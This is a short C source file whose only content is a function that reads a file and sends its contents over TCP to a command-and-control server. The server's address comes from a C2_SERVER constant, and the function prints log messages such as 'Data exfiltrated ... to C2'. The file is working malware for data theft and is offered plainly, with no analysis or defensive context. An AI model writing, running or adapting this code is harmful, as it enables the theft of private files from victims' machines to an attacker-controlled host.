#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "config.h"

void exfiltrate_data(const char *file_path) {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];
    FILE *file = fopen(file_path, "r");

    if(file == NULL) {
        perror("[!] Failed to open file");
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        perror("Can't create socket");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(80); //http
    server.sin_addr.s_addr = inet_addr(C2_SERVER);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[!] Connection to C2 failed");
        close(sock);
        return;
    }

    while(fgets(buffer, sizeof(buffer), file)) {
        send(sock, buffer, strlen(buffer), 0);
    }
    printf("[+] Data exfiltrated from %s to C2\n", file_path);

    fclose(file);
    close(sock);
}